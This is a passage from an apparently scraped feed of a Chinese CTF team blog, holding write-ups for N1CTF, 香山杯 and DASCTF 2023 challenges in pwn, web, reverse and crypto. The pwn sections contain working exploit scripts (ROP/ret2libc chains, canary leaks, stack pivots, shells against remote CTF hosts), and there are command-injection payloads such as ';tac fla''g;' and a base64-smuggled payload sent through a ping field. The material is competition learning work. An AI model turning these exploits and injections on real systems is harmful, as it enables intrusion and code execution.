13, 11, 15, 13, 11, 4, 14, 7, 14, 14, 10, 15, 15, 13, 16, 16, 11, 10, 20, 15, 8, 12, 17, 14, 8, 14, 17, 14, 21, 16, 15, 23, 13, 18, 14, 20, 11, 13, 20, 20, 16, 19, 16, 11, 16, 23, 21, 18, 16, 21, 18, 17, 19, 15, 13, 20, 13, 22, 23, 18, 17, 18, 21, 19, 22, 22, 17, 21, 16, 18, 15], [4197799, 4197792, 4197790, 4197798, 4197797, 4197801, 4197794, 4197796, 4197803, 4197801, 4197796, 4197795, 4197803, 4197795, 4197800, 4197793, 4197799, 4197799, 4197798, 4197793, 4197795, 4197796, 4197799, 4197804, 4197804, 4197797, 4197804, 4197794, 4197796, 4197798, 4197802, 4197798, 4197794, 4197799, 4197795, 4197803, 4197798, 4197802, 4197800, 4197804, 4197805, 4197798, 4197801, 4197804, 4197801, 4197805, 4197804, 4197799, 4197802, 4197799, 4197810, 4197804, 4197801, 4197807, 4197808, 4197806, 4197808, 4197806, 4197803, 4197804, 4197806, 4197801, 4197809, 4197803, 4197807, 4197804, 4197807, 4197803, 4197808, 4197806, 4197806, 4197815, 4197807, 4197816, 4197807, 4197813, 4197805, 4197801, 4197805, 4197806, 4197814, 4197810, 4197807, 4197811, 4197811, 4197809, 4197810, 4197809, 4197813, 4197810, 4197810, 4197815, 4197812, 4197808, 4197804, 4197808, 4197804, 4197811, 4197813, 4197815, 4197808, 4197808, 4197815, 4197815, 4197814, 4197819, 4197812, 4197816, 4197818, 4197815, 4197816, 4197817, 4197809, 4197811, 4197806, 4197817, 0, 3, 4197810, 4197816, 4197812, 4197819, 4197817, 4197811, 4197819, 4197815, 4197818, 4197814, 4, 4197816, 4197818, 4197818, 2, 4197820, 2, 4197816, 4197820, 1, 3, 2, 2, 3, 8, 1, 0, 4197816, 8, 9, 4, 4, 9, 6, 3, 6, 4, 12, 5, 3, 3, 7, 10, 9, 6, 6, 12, 13, 9, 12, 5, 7, 11, 13, 14, 12, 20, 8, 14, 11, 9, 13, 13, 12, 10, 14, 25, 13, 15, 14, 15, 12, 17, 22, 13, 14, 8, 20, 18, 16, 14, 18, 20, 19, 12, 18, 14, 20, 12, 21, 17, 27, 18, 13, 13, 16, 18, 19, 20, 19, 21, 20, 17, 21, 23, 19, 22, 21, 18, 18, 21, 28, 15, 19, 21, 25, 23, 21, 26, 20, 25, 22, 31, 30, 30, 24, 21, 21, 24, 24, 18, 22, 27, 23, 24, 24, 30, 26]]ct = a7076cebf86512a42b5258d5b197b2065123618122662c2c1533f698da00f21b4c0dbe5afd4cfd093339521ff61f7c4e</code></pre><p>分析程序，可以发现在4A=A的条件下，yv是由15个相同的ye生成的。</p><p>源程序为：</p><p>te=Av*sv</p><p>we=Av*yv</p><p>zv=ce*sv+yv</p><p>注意到yv=[ye]*15</p><p>所以we=sum(Av)*ye</p><p>所以ye可解，yv可解，sv=(zv-yv)/ce</p><p><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202401310950653.png"></p><h3 id="签到-x2F-问卷"><a href="#签到-x2F-问卷" class="headerlink" title="签到/问卷"></a>签到/问卷</h3><p>在对应位置获取即可（）</p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="n1canary"><a href="#n1canary" class="headerlink" title="n1canary"></a>n1canary</h3><p>硬干十小时的题目，最后也没有做出来，有点小不甘….（还是对漏洞不是很敏感，对C++ pwn的题型也接触的太少了）</p><p>写一下思路历程吧：</p><ol><li>一开始把注意力放在了canary的泄露和绕过上，搞半天发现又是随机又是加密根本绕不过，只有一次可能的输出根本泄露不了一点</li><li>之后研究了下C++异常捕获基址，可以直接不判断canary，回退执行，但是出题人在捕获之后加了个exit（裂开），并没有什么用</li><li>再之后想通过Unwind_RaiseException唯一的leave_ret完成栈迁移然后发现输入点在gadget的下方（double裂开）</li></ol><p>赛后复现了一下，调试的过程（下了六个断点）和静态分析基本上没有问题，思路在某些方面还是对的（通过C++捕获异常绕过两个canary，在bss段上布置backdoor）。问题出在没有注意析构函数<code>_QWORD *__fastcall std::unique_ptr&lt;BOFApp&gt;::~unique_ptr(__int64 a1)</code> 内部一个函数<code>std::default_delete&lt;BOFApp&gt;::operator()(deleter, *v2)</code>有一个对寄存器储存的地址经过两次解引用的调用：</p><p><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202401300004254.png" alt="img"></p><p>可以看到，程序将rax的值作为地址解析并将rax的值指向的空间的数据储存到rdx，给rdx加上8后又将rdx指向的内存储存的数据传给rdx，最后执行rdx指向的内容</p><blockquote><p><em>于是，自然产生了这样的想法：要是能够控制rax的值，不就可以执行任意地址指向的内容了吗</em></p></blockquote><p>同样，可以执行我们程序给出的后门函数</p><p><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202401300004549.png" alt="img"></p><p>调试可以发现，scanf有溢出，同时栈上读入点离上述rax地址相差0x70</p><p><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202401300004311.png" alt="img"></p><p>溢出前</p><p><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202401300004183.png" alt="img"></p><p>溢出后</p><p><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202401300004019.png" alt="img"></p><p>这样在捕获异常后，继续执行析构函数就可以对rax解析一次后得到user_canary的地址0x4f4aa0，接下来还要继续对0x4f4aa0上储存的数据进行一次解析并调用，所以我们就可以通过第一次输入在user_canary写入backdoor地址，来构造rop</p><blockquote><p><em>至此，思路就明了了，分为两步：1、第一次输入写入backdoor地址构造<strong>rop</strong>，2、第二次输入溢出覆盖rax为user_canary地址</em></p></blockquote><p>注意几个坑：</p><ol><li>测试的时候输入的数据不能太大，不然会卡在uw_frame_state_for函数根本没法执行到析构函数，分析不了一点</li><li>注意sl还是sd，单个自己解的影响在这题比较大（scanf在\n处截断）</li><li>第二步溢出的时候记得不要改变地址0x403407，不然也会卡住（和1类似）</li></ol><pre class=" language-Python"><code class="language-Python">from Excalibur import *contextset()proc('./pwn')debug('b *0x0000000000403547\n b *0x0000000000403633\n b *0x00000000004037D5\nb *0x0000000000403245\nb *0x000000000040343C\nb *0x42099a\nb *0x040354C\nb *0x00000000004038E6\nb *0x403407\n b *0x41fe58')#debug('b cxa_begin_catch')system = 0x000000000040338Bcanary = 0x4f4aa0pay = (p64(canary)+p64(system)).ljust(0x40,b'a')#40sda(b'\n',pay)pr(pay)#sla(b'pwn :)',p64(0x4f4aa0))##sla(b'pwn :)',b'a'*0x60)#sla(b'pwn :)',b'a'*0x68+p64(0x403407)+p64(canary))#pr(rc())ia()</code></pre><p>总结：还是得gdb和IDA结合者看啊，缺少任何一个都不行；C++析构函数很容易出现漏洞·</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="HASHTEAM&#39;wp" scheme="http://lmarch2.github.io/categories/HASHTEAM-wp/"/>
    
    
    <category term="ctf" scheme="http://lmarch2.github.io/tags/ctf/"/>
    
    <category term="N1CTF" scheme="http://lmarch2.github.io/tags/N1CTF/"/>
    
  </entry>
  
  <entry>
    <title>HASHTEAM2024香山杯WP</title>
    <link href="http://lmarch2.github.io/posts/2611e12a/"/>
    <id>http://lmarch2.github.io/posts/2611e12a/</id>
    <published>2023-10-27T13:00:57.000Z</published>
    <updated>2024-02-04T06:55:26.435Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>本wp是队友们共同努力的结果，感谢.N1nEmAn、HeyGap、1cfh、shui、hash_hash等师傅。</p><h1 id="HASHTEAM香山杯WP"><a href="#HASHTEAM香山杯WP" class="headerlink" title="HASHTEAM香山杯WP"></a>HASHTEAM香山杯WP</h1><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><p>将题目所给编码丢入赛博大厨，得到类似凯撒密码的字符串。</p><p><img src="https://s2.loli.net/2023/10/15/CcQBj3qFVfG4por.png" alt="image-20231015173916142.png"></p><p>因为flag格式第一个是f，则可以确定凯撒的偏移，得到flag。</p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="PHP-unserialize-pro"><a href="#PHP-unserialize-pro" class="headerlink" title="PHP_unserialize_pro"></a>PHP_unserialize_pro</h3><p>查看源码，很显然就是一个反序列化利用。</p><p><img src="https://s2.loli.net/2023/10/15/5mISwDTexlO9PpL.png"></p><p>但是过滤了f l a g * ?，需要绕过。这里首先使用<code>dir -1 /</code>查看flag位置，发现是在第五个。<br><img src="https://s2.loli.net/2023/10/16/QK4y5GvgnJfXl8h.png"><br>然后使用<code>rev /$(dir -l / | sed -n 5p)</code>读取flag。<br><img src="https://s2.loli.net/2023/10/16/WgVm8jUzdBN6fGO.png"><br>得到一个反向flag。</p><p>再次反向得到flag。</p><pre class=" language-sh"><code class="language-sh">~/ctf/match/xsb2023/web » rev flag                                                                                            N1nE@N1nEmAnflag{8bab51a8-191e-4e78-8ca4-f1fc3fb6c018}</code></pre><h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="URL从哪儿来"><a href="#URL从哪儿来" class="headerlink" title="URL从哪儿来"></a>URL从哪儿来</h3><p>运行题目所给的附件，设置断点在”ou.exe”所在处。在相应文件夹找到ou.exe的相关文件，然后拖入ida。<img src="https://s2.loli.net/2023/10/15/okIht1KHN2BYnJG.png"></p><p>运行ou.exe文件，发现在v18 += strlen(v18)处下断点，搜索flag可以得到flag。<img src="https://s2.loli.net/2023/10/15/EN1HQ9wIjrxizyL.png"></p><h3 id="hello-python"><a href="#hello-python" class="headerlink" title="hello python"></a>hello python</h3><p>了解到是python写的apk，定位所有与组件无关的后发现app.imy文件(用zip可以打开)，打开是个xxtea，直接解密即可。</p><pre class=" language-py"><code class="language-py">def shift(z, y, x, k, p, e):    return ((((z >> 5) ^ (y << 2)) + ((y >> 3) ^ (z << 4))) ^ ((x ^ y) + (k[(p & 3) ^ e] ^ z)))def encrypt(v, k):    delta = 0x9E3779B9    n = len(v)    rounds = 6 + 52 // n    x = 0    z = v[n - 1]    for i in range(rounds):        x = (x + delta) & 0xFFFFFFFF        e = (x >> 2) & 3        for p in range(n - 1):            y = v[p + 1]            v[p] = (v[p] + shift(z, y, x, k, p, e)) & 0xFFFFFFFF            z = v[p]        p += 1        y = v[0]        v[n - 1] = (v[n - 1] + shift(z, y, x, k, p, e)) & 0xFFFFFFFF        z = v[n - 1]    return vdef decrypt(v, k):    delta = 0x9E3779B9    n = len(v)    rounds = 6 + 52 // n    x = (rounds * delta) & 0xFFFFFFFF    y = v[0]    for i in range(rounds):        e = (x >> 2) & 3        for p in range(n - 1, 0, -1):            z = v[p - 1]            v[p] = (v[p] - shift(z, y, x, k, p, e)) & 0xFFFFFFFF            y = v[p]        p -= 1        z = v[n - 1]        v[0] = (v[0] - shift(z, y, x, k, p, e)) & 0xFFFFFFFF        y = v[0]        x = (x - delta) & 0xFFFFFFFF    return vc = [689085350 ,626885696 ,1894439255 ,1204672445 ,1869189675 ,475967424 ,1932042439 ,1280104741 ,2808893494 ]k = [12345678 ,12398712 ,91283904 ,12378192 ]m = (decrypt(c, k))for i in m:    print(bytes.fromhex(hex(i)[2:]).decode()[::-1], end='')--------------------------------------------------------------------</code></pre><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="Move"><a href="#Move" class="headerlink" title="Move"></a>Move</h3><p>一道简单的栈迁移。第一次迁移到所给的skdd之后，泄露puts函数地址，接着返回到main，由于栈已经被迁移，返回地址被篡改，此时直接输入one_shot，即可返回到one_shot的地址上，从而getshell。具体的在注释。</p><pre class=" language-py"><code class="language-py">from evilblade import *context(os='linux', arch='amd64')context(os='linux', arch='amd64', log_level='debug')setup('./pwn2')#libset('libc-2.31.so')rsetup('101.201.35.76',29720)evgdb()rdi = 0x401353lv = 0x000000000040124bpay = p64(rdi) + p64(gotadd('puts')) + p64(pltadd('puts'))+ p64(0x401264)#泄露puts之后，返回到mainsd(pay)sa('ber',p32(0x12345678))#符合判断，执行溢出sd(b'a'*0x30+p64(0x405098)+p64(lv))#溢出进行栈迁移到skddaddx = getx64(-7,-1)base = addx - 0x80970sys = base + 0x4f420binsh = base + 0x1b3d88os = base + 0x4f302#输入oneshot，getshellsl(p64(os))#sd(p32(0x12345678))#sd(b'a'*0x30+p64(0x405098)+p64(lv))ia()'''============================================================0x000000000040134c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x000000000040134e : pop r13 ; pop r14 ; pop r15 ; ret0x0000000000401350 : pop r14 ; pop r15 ; ret0x0000000000401352 : pop r15 ; ret0x000000000040134b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x000000000040134f : pop rbp ; pop r14 ; pop r15 ; ret0x000000000040119d : pop rbp ; ret0x0000000000401353 : pop rdi ; ret0x0000000000401351 : pop rsi ; pop r15 ; ret0x000000000040134d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x000000000040101a : ret'''</code></pre><h3 id="pwthon"><a href="#pwthon" class="headerlink" title="pwthon"></a>pwthon</h3><p>这道题目看起来很麻烦，实际上发现<code>app.cpython-37m-x86_64-linux-gnu.so </code>就是cpython，就是python文件编译的有cpython库和libc库的一道题。</p><p>手动测试，发现每次输入会返回一个一模一样 的东西，猜测有格式化字符串漏洞。结果发现真有，由此泄露canary。</p><p><img src="https://s2.loli.net/2023/10/15/TNGqlfdvkIcJwLR.png"></p><p>观察到so文件中有Give you ……字符串，此处即是刚才运行的函数，发现有栈溢出漏洞。</p><p><img src="https://s2.loli.net/2023/10/15/pXufcVrYDHGwyLd.png"></p><p>有了栈溢出和canary，那么直接打ret2libc即可。</p><pre class=" language-py"><code class="language-py">from evilblade import *context(os='linux', arch='amd64')context(os='linux', arch='amd64', log_level='debug')setup('pwn')rsetup('39.106.48.123', 13099)evgdb()sla('>', b'0')addx = getx(-15,-1)base = addx - 0x68b0dpx('base', base)sl(b'aaaaaaaa'+b'%p-'*38)can = getx(-20,-2)dpx('canary',can)rdi = base + 0x0000000000003f8fflag = base + 0x013B66rsi = base + 0x0000000000003cd9puts = base + 0x3710read = base + 0x3940op = base + 0x3ae0bss = base + 0x16a80write = base + 0x3760ret = base +0x000000000000301a#pay=(b'aaaaaaaa'*0x20+p64(can)*3+p64(rdi)+p64(binsh)+p64(puts))pay=(b'aaaaaaaa'*0x20+p64(can)*3+p64(rdi)+p64(base+0x016078)+p64(puts)+p64(base + 0x99f0))sl(pay)libc = tet()libc = getx64(0,-1) - 0x80970dpx('libcbase', libc)sl(b'a')pay=(b'aaaaaaaa'*0x20+p64(can)*3+p64(rdi)+p64(libc + 0x1b3d88)+p64(ret)+p64(libc + 0x4f420)+p64(0xdeadbaef))sl(pay)ia()</code></pre><p>参考文章补充一下，实在不知道怎么调试。打灰盒好累hhh。</p><p><a href="https://www.cnblogs.com/ve1kcon/p/17766267.html">https://www.cnblogs.com/ve1kcon/p/17766267.html</a></p><pre class=" language-py"><code class="language-py">Pwthonpython pwn？实际上也是去跑 c 程序，不过还是第一次见。封装了一个 so 库，在 python 代码中会去调用这个库的函数，这样的话，相比起常规 pwn 题，就是会不好去调试。将库文件丢进 ida 分析，表面很复杂，有种做 vm 题的感觉（bushi实际上在第一个输入点输入0就能进入到 __pyx_f_3app_Welcome2Pwnthon 函数了，存在格式化字符串漏洞和栈溢出，而且直接给了 _pyx_f_3app_get_info 函数的地址，就能去计算这个库程序的基地址了，先泄 canary，后面就是 ret2libc 来 getshell 了image比较特别的点就是 __printf_chk 函数相较于普通的 printf 函数，不能使用 %N$ 的形式泄数据，然后格式化字符串的偏移是5（刚开始发现在上图中第一个 read 处直接敲个回车或者发送刚好 0x100 字节的数据过去之后都能泄点栈数据出来，比赛做这道题时琢磨了挺久这些数据能怎么用，因为当时没配通本地运行环境，也不知道泄出的是什么数据，然后后面倒是没用上这些数据赛后折腾了下运行环境，要和他生成 .so 用的 python3.7 版本一样才能运行，这样添加一下 syspath 就能直接 import app 了，在脚本中连gdb调试的话是这样写gdb.debug(['python','main.py'])断点断在 PyImport_ImportModule+4，然后一直往下运行看看那个包导入了 .soexp 如下from pwn import *from LibcSearcher import*p = remote('101.201.35.76', 20611)context(os = 'linux', arch = 'amd64', log_level = 'debug')p.sendline('0')p.recvuntil('0x')s = p.recv(12)get_info_addr = int(s,16)log.info("get_info_addr: " + hex(get_info_addr))libc_base = get_info_addr - 0x68B0log.info('libc_base: ' + hex(libc_base))# 5+(0x118-0x10)/0x8payload = '%p'*37 + 'flag' + '%p'p.sendline(payload)p.recvuntil('flag')p.recvuntil('0x')leak_canary = p.recv(16)leak_canary = int(leak_canary,16)log.info('leak_canary: ' + hex(leak_canary))pop_rdi_ret = libc_base + 0x3f8fpop_rsi_ret = libc_base + 0x3cd9main = libc_base + 0x99F0puts_plt = libc_base + 0x3710puts_got = libc_base + 0x16078payload =  'a'*0x108 + p64(leak_canary) + 'a'*8payload += p64(pop_rdi_ret)payload += p64(puts_got)payload += p64(puts_plt)payload += p64(main)p.sendline(payload)puts_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))libc = LibcSearcher('puts',puts_addr)libc_base2 = puts_addr - libc.dump('puts')log.info('libc_base2: ' + hex(libc_base2))binsh = libc_base2 + libc.dump('str_bin_sh')system = libc_base2 + libc.dump('system')p.sendline('a')ret = libc_base + 0x9A93payload = 'a'*0x108 + p64(leak_canary) + 'a'*8payload += p64(ret)payload += p64(pop_rdi_ret)payload += p64(binsh)payload += p64(system)p.sendline(payload)p.interactive()</code></pre><h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="strange-hash"><a href="#strange-hash" class="headerlink" title="strange_hash"></a>strange_hash</h3><p>注意到没验证num tuple长度，直接求逆问题然后在得到的三元组后加一位0就行。</p><pre class=" language-py"><code class="language-py">p = 18446744073709551557M = [[8, 56, 280], [18446744073709551543, 18446744073709551467, 18446744073709551123], [7, 35, 155]]ConInv = [0x39a3f978106bac2d,0x2940e055f4a33725,0xfda9a7a293fb5bc9]Con = [[0x9c52c2de7a9373c4,0xf2135cb886d0fa21,0x957df7f3cd4879e9], [0xd54f837d2738d717,0x400ddf1ffaae436d,0xc2abb601d9a26b07], [0x1904359f1deb3495,0xc21aa09ba52b157b,0x3d45525db1b19a0c], [0xed66cf26a65afc73,0x1cee569b29ffa476,0x3da45abf4304849], [0x1c1a642fa0f3d96d,0x59a1c4fbb96aec86,0xa18e9ca93163f63d], [0x9621ec9fbcb402be,0xd69468353c31bee0,0x50655b3f20fee3b8], [0x109cde7a61c2c195,0x5ebbd9e98be60c59,0x334d2d15f6e43190], [0x47af2b0d63901977,0x67ace097bf8c6f34,0xb87da3296b70d64b], [0x52d6344b38f49899,0xad5773add31420e1,0xecd0b7480f8c8095], [0xe2afb6d20f5decda,0xb1767d8be7d1371,0x902fd6806a0ef4db]]M = matrix(GF(p), M)u = vector(Zmod(p), [1, 1, 0])phi = M.multiplicative_order()d = inverse_mod(3, phi)def mypow(c, a):    res = []    for i in c:        res.append(pow(i, a, p))    return vector(GF(p), res)c3 = vector(GF(p), Con[3])c2 = vector(GF(p), Con[2])c1 = vector(GF(p), Con[1])c0 = vector(GF(p), Con[0])ni = M^(-1)u = mypow((u-c3)*ni, 3)u = mypow((u-c2)*ni, d)u = mypow((u-c1)*ni, 3)u = mypow((u-c0)*ni, d)-vector(GF(p), ConInv)print(u)'''(5329202944861711021, 10075872277090249537, 6598944197421011167,0 )'''</code></pre><h3 id="lift"><a href="#lift" class="headerlink" title="lift"></a>lift</h3><p>ged-251=0 mod p^4，coppersmith取beta=4/6，epsilon=0.03求解d mod p^4，利用ed-1和n做gcd分解n，最后有限域开根做lift即可</p><pre class=" language-Python"><code class="language-Python">from Crypto.Util.number import *from gmpy2 import irootn = 108960799213330048807537253155955524262938083957673388027650083719597357215238547761557943499634403020900601643719960988288543702833581456488410418793239589934165142850195998163833962875355916819854378922306890883033496525502067124670576471251882548376530637034077e = 3359917755894163258174451768521610910491402727660720673898848239095553816126131162471035843306464197912997253011899806560624938869918893182751614520610693643690087988363775343761651198776860913310798127832036941524620284804884136983215497742441302140070096928109039c = 72201537621260682675988549650349973570539366370497258107694937619698999052787116039080427209958662949131892284799148484018421298241124372816425123784602508705232247879799611203283114123802597553853842227351228626180079209388772101105198454904371772564490263034162PR.<x> = PolynomialRing(Zmod(n))f = e*x-251f = f.monic()d = f.small_roots(X=2^256, beta=0.63, epsilon=0.03)[0]p = iroot(GCD(e*d-251, n), 4)[0]q = n//p^5assert n == p^5*qphi = (p-1)*p^4*(q-1)d = inverse_mod(e//251, phi)cm = ZZ(pow(c, d, n))F1 = Zmod(p^3)F2 = Zmod(q)root1 = F1(cm).nth_root(251, all=True)root2 = F2(cm).nth_root(251, all=True)for i in root1:    for j in root2:        m = ZZ(crt([ZZ(i), ZZ(j)], [p^3, q]))        if m.nbits() <= 512:            m = long_to_bytes(m)            print(m)</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="HASHTEAM&#39;wp" scheme="http://lmarch2.github.io/categories/HASHTEAM-wp/"/>
    
    
    <category term="ctf" scheme="http://lmarch2.github.io/tags/ctf/"/>
    
    <category term="杯子" scheme="http://lmarch2.github.io/tags/%E6%9D%AF%E5%AD%90/"/>
    
  </entry>
  
  <entry>
    <title>DASCTF X CBCTF 2023 WP</title>
    <link href="http://lmarch2.github.io/posts/ec1aa757/"/>
    <id>http://lmarch2.github.io/posts/ec1aa757/</id>
    <published>2023-10-27T12:56:45.000Z</published>
    <updated>2024-02-04T09:19:32.946Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="DASCTF-X-CBCTF-2023-WP"><a href="#DASCTF-X-CBCTF-2023-WP" class="headerlink" title="DASCTF X CBCTF 2023 WP"></a>DASCTF X CBCTF 2023 WP</h1><p><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202310221106000.png" alt="image-20231022110621972"></p><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="EASYBOX"><a href="#EASYBOX" class="headerlink" title="EASYBOX"></a>EASYBOX</h2><p>这题一开始通过CAT函数读出canary.txt，然后找溢出点找了两小时😅</p><p>最后发现直接就是个web题，在PING函数里面执行system函数命令</p><blockquote><p>;tac fla’’g;</p></blockquote><p><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202310272057437.png" alt="image-20231021182601723"></p><p>还有一种解法是栈溢出</p><p>catCommand中strcat的第二个参数s没有ban掉”..”，所以存在目录穿越能够读前面init函数中的canary文件</p><p><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202402041714346.png" alt="yhKJ12TU1sfxJbU3e4J4fbAKeqwQuVTxDapfrLcNOvo"></p><p>gets是把v1这个fd对应的文件中的数据读到栈上，读0x200大小，但其实v11这个数组只有120大小，所以就可能存在溢出</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> Excalibur <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">import</span> base64contextset<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#remo('node4.buuoj.cn',25365)</span>proc<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span>b<span class="token string">'name:'</span><span class="token punctuation">,</span>b<span class="token string">'a\n'</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span>b<span class="token string">'a'</span><span class="token punctuation">,</span>b<span class="token string">'CAT'</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span>b<span class="token string">'view:'</span><span class="token punctuation">,</span>b<span class="token string">'../secret/canary.txt'</span><span class="token punctuation">)</span>rc<span class="token punctuation">(</span><span class="token punctuation">)</span>canary <span class="token operator">=</span> <span class="token punctuation">(</span>ru<span class="token punctuation">(</span>b<span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>canary <span class="token operator">=</span> int<span class="token punctuation">(</span>canary<span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>prh<span class="token punctuation">(</span>canary<span class="token punctuation">)</span>pop_rdi <span class="token operator">=</span> <span class="token number">0x0000000000401ce3</span>binsh <span class="token operator">=</span> <span class="token number">0x0000000000402090</span>ret <span class="token operator">=</span> <span class="token number">0x000000000040101a</span>system <span class="token operator">=</span> <span class="token number">0x00000000004018B2</span>sla<span class="token punctuation">(</span>b<span class="token string">'$'</span><span class="token punctuation">,</span>b<span class="token string">'PING'</span><span class="token punctuation">)</span>pay <span class="token operator">=</span> b<span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x48</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span>pay <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>pay<span class="token punctuation">)</span>py <span class="token operator">=</span> b<span class="token string">";echo "</span><span class="token operator">+</span>b<span class="token string">'"'</span>py <span class="token operator">+=</span> paypy <span class="token operator">+=</span> b<span class="token string">'" | base64 -d'</span>sla<span class="token punctuation">(</span>b<span class="token string">"address"</span><span class="token punctuation">,</span>py<span class="token punctuation">)</span>sla<span class="token punctuation">(</span>b<span class="token string">'$'</span><span class="token punctuation">,</span>b<span class="token string">"CAT"</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span>b<span class="token string">"view"</span><span class="token punctuation">,</span><span class="token string">"result.txt"</span><span class="token punctuation">)</span>ia<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="GuestBook"><a href="#GuestBook" class="headerlink" title="GuestBook"></a>GuestBook</h2><p>输入name的时候有溢出，可以覆盖一个字节泄露canary，</p><p>接着在strcpy中有溢出，直接传payload，被strcpy遇b’\x00’截断这个问题卡住了（遇零截断意味着无法传输字符\x00，然而canary以\x00结尾）</p><p>调试解决发现在  __isoc99_scanf(“%s”, message);输入字符串的时候会在后面补零</p><p>于是可以通过多次输入先输入覆盖返回地址和canary除去\x00的七个字符，再给canary补上\x00</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> Excalibur <span class="token keyword">import</span><span class="token operator">*</span>contextset<span class="token punctuation">(</span><span class="token punctuation">)</span>remo<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">28227</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#proc('./GuestBook')</span><span class="token comment" spellcheck="true">#debug('b *0x000000000040143C')</span>sla<span class="token punctuation">(</span>b<span class="token string">'name:'</span><span class="token punctuation">,</span>b<span class="token string">'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x17</span><span class="token punctuation">)</span><span class="token operator">+</span>b<span class="token string">'b'</span><span class="token punctuation">)</span>t1 <span class="token operator">=</span> ru<span class="token punctuation">(</span>b<span class="token string">'\n'</span><span class="token punctuation">)</span>pr<span class="token punctuation">(</span>t1<span class="token punctuation">)</span>canary0 <span class="token operator">=</span> ru<span class="token punctuation">(</span>b<span class="token string">'How'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">7</span><span class="token punctuation">]</span>canary <span class="token operator">=</span> <span class="token punctuation">(</span>u64<span class="token punctuation">(</span>b<span class="token string">'\x00'</span><span class="token operator">+</span>canary0<span class="token punctuation">)</span><span class="token punctuation">)</span>prh<span class="token punctuation">(</span>canary<span class="token punctuation">)</span>system <span class="token operator">=</span> <span class="token number">0x00000000004012C3</span>sla<span class="token punctuation">(</span>b<span class="token string">'):'</span><span class="token punctuation">,</span>b<span class="token string">'4'</span><span class="token punctuation">)</span>sl<span class="token punctuation">(</span>cyclic<span class="token punctuation">(</span><span class="token number">0x98</span><span class="token punctuation">)</span><span class="token operator">+</span>b<span class="token string">'a'</span><span class="token operator">+</span>canary0<span class="token operator">+</span>b<span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>sl<span class="token punctuation">(</span>b<span class="token string">'a'</span><span class="token punctuation">)</span>sl<span class="token punctuation">(</span>b<span class="token string">'a'</span><span class="token punctuation">)</span>pr<span class="token punctuation">(</span>type<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token punctuation">)</span>pay <span class="token operator">=</span> cyclic<span class="token punctuation">(</span><span class="token number">0x38</span><span class="token 